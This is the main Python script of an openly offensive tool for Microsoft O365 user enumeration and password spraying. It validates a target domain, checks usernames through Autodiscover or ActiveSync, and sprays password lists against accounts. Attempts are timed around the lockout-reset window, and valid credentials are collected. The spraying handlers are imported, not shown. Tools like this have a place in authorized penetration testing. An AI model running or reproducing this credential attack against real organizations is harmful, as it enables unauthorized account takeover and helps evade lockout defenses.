#!/usr/bin/env python3

import sys
import signal
import asyncio
import argparse
from pathlib import Path
from core.utils.helper import *
from core.handlers.sprayer import *
from core.handlers.validator import *
from core.handlers.enumerator import *


__version__ = '1.1'

# Signal handler for Enum routines
def enum_signal_handler(signal, frame):
    enum.shutdown(key=True)
    print("\n[+] Valid Accounts: %d" % len(enum.valid_accts))
    sys.exit()

# Signal handler for Spray routines
def spray_signal_handler(signal, frame):
    spray.shutdown(key=True)
    print("\n[+] Valid Credentials: %d" % len(spray.valid_creds))
    sys.exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer -- v{VERS}".format(VERS=__version__))

    # Target domain
    parser.add_argument("-d", "--domain", type=str, help="Target O365 domain", required=True)
    # Type of scan to perform
    parser.add_argument("--validate", action="store_true", help="Perform domain validation only.")
    parser.add_argument("--enum",     action="store_true", help="Perform username enumeration.")  # Can be used with spray
    parser.add_argument("--spray",    action="store_true", help="Perform password spraying.")     # Can be used with enum
    # Username(s)/Password(s) to be used during enum/spray
    parser.add_argument("-u", "--username", type=str, help="Username(s) delimited using commas.")
    parser.add_argument("-p", "--password", type=str, help="Password(s) delimited using commas.")
    parser.add_argument("-U", "--userfile", type=str, help="File containing list of usernames.")
    parser.add_argument("-P", "--passfile", type=str, help="File containing list of passwords.")
    # Lockout policy
    parser.add_argument("-c", "--count",    type=int,   help="Number of password attempts to run before resetting lockout timer. Default: 1", default=1)
    parser.add_argument("-l", "--lockout",  type=float, help="Lockout policy reset time (in minutes). Default: 15 minutes", default=15.0)
    # Scan specifications
    parser.add_argument("--validate-type",  type=str.lower, default='getuserrealm', choices=('openid-config', 'getuserrealm'), help="Specify which spray type to perform. Default: getuserrealm")
    parser.add_argument("--enum-type",      type=str.lower, default='autodiscover', choices=('activesync', 'autodiscover'),    help="Specify which spray type to perform. Default: Autodiscover")
    parser.add_argument("--spray-type",     type=str.lower, default='autodiscover', choices=('activesync', 'autodiscover', 'msol'),    help="Specify which spray type to perform. Default: Autodiscover")
    parser.add_argument("--rate",           type=int, help="Number of concurrent connections during enum and spray. Default: 10", default=10)
    parser.add_argument("--safe",           type=int, help="Terminate scan if `n` locked accounts are observed. Default: 10", default=10)
    parser.add_argument("--paired",         action="store_true", help="Password spray pairing usernames and passwords (1:1).")
    # HTTP configurations
    parser.add_argument("--timeout", type=int, help="Request timeout. Default: 25", default=25)
    parser.add_argument("--proxy",   type=str, help="Proxy to pass traffic through: [http(s)://ip:port]")
    # Misc config
    parser.add_argument("--output",  type=str, help="Output directory. Default: Current directory", default=".")
    parser.add_argument("--debug",   action="store_true", help="Debug output")
    args = parser.parse_args()


    # Lazy banner...
    print("\n*** O365 Spray ***\n")

    # If enumerating users make sure we have a username or username file
    if args.enum and (not args.username and not args.userfile):
        parser.error("-u/--username or -U/--userfile is required when performing user enumeration via -e/--enum.")

    # If password spraying make sure we have username(s) and password(s)
    if args.spray and ((not args.username and not args.userfile) or (not args.password and not args.passfile)):
        parser.error("[-u/--username or -U/--userfile] and [-p/--password or -P/--passfile] are required" +
                     " when performing password spraying via -s/--spray.")

    start  = time.time()
    helper = Helper()

    # Clean output dir
    args.output = args.output.rstrip('/')

    # Perform domain validation
    print("[*] Performing O365 validation for: %s\n" % args.domain)
    validator = Validator(args=args)
    valid = validator.validate()
    if not valid or args.validate:
        (args.enum, args.spray) = (False, False)


    # Perform user enumeration
    if args.enum:
        # Create enum directory
        Path("%s/enum/" % args.output).mkdir(parents=True, exist_ok=True)

        loop = asyncio.get_event_loop()

        # Support both username(s) and a username file being provided
        password = "Password1" if not args.password else args.password
        userlist = []
        if args.username:
            userlist += args.username.split(',')
        if args.userfile:
            userlist += helper.get_list_from_file(args.userfile)

        print("\n[*] Performing user enumeration against %d potential users\n" % (len(userlist)))

        enum = Enumerator(
            loop=loop,
            args=args
        )

        # Add signal handler to handle ctrl-c interrupts
        signal.signal(signal.SIGINT,  enum_signal_handler)
        signal.signal(signal.SIGTERM, enum_signal_handler)

        try:
            loop.run_until_complete(enum.run(userlist, password))

            enum.shutdown()
            print("\n[+] Valid Accounts: %d" % len(enum.valid_accts))

            loop.run_until_complete(asyncio.sleep(0.250))
            loop.close()

        except KeyboardInterrupt as e:
            pass


    # Perform password spray
    if args.spray:
        # Create spray directory
        Path("%s/spray/" % args.output).mkdir(parents=True, exist_ok=True)

        loop = asyncio.get_event_loop()

        # Support both password(s) and a password file being provided
        passlist = []
        if args.password:
            passlist += args.password.split(',')
        if args.passfile:
            passlist += helper.get_list_from_file(args.passfile)

        # Use validated users if enumeration was run
        if args.enum:
            userlist = enum.valid_accts
            # Sleep if ActiveSync was used for enumeration
            if args.enum_type == 'activesync':
                print("\n[*] Enumeration was run. Resetting lockout before password spraying.")
                print("[*] Sleeping for %.1f minutes" % (args.lockout))
                helper.lockout_reset_wait(args.lockout)

        else:
            # Support both username(s) and a username file being provided
            userlist = []
            if args.username:
                userlist += args.username.split(',')
            if args.userfile:
                userlist += helper.get_list_from_file(args.userfile)

        if len(userlist) < 1:
            if args.debug: print("\n[DEBUG] No users to run a password spray against.")

        else:
            print("\n[*] Performing password spray against %d users." % len(userlist))

            spray = Sprayer(
                loop=loop,
                userlist=userlist,
                args=args
            )

            # Add signal handler to handle ctrl-c interrupts
            signal.signal(signal.SIGINT,  spray_signal_handler)
            signal.signal(signal.SIGTERM, spray_signal_handler)

            try:
                if not args.paired:
                    for password_chunk in helper.get_chunks_from_list(passlist, args.count):
                        print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
                        # Loop through each password individually so it's easier to keep track and avoid duplicate scans once a removal condition is hit
                        for password in password_chunk:
                            loop.run_until_complete(spray.run(password))

                        # Check if we reached the last password chunk
                        if not helper.check_last_chunk(password_chunk, passlist):
                            helper.lockout_reset_wait(args.lockout)

                else:
                    print("[*] Password spraying using paired usernames and passwords.")

                    loop.run_until_complete(spray.run_paired(passlist))
                    # Since we are pairing usernames and passwords, we can ignore the lockout reset wait call

                spray.shutdown()
                print("\n[+] Valid Credentials: %d" % len(spray.valid_creds))

                loop.run_until_complete(asyncio.sleep(0.250))
                loop.close()

            except KeyboardInterrupt as e:
                pass


    elapsed = time.time() - start
    if args.debug: print("\n[DEBUG] %s executed in %0.2f seconds." % (__file__, elapsed))
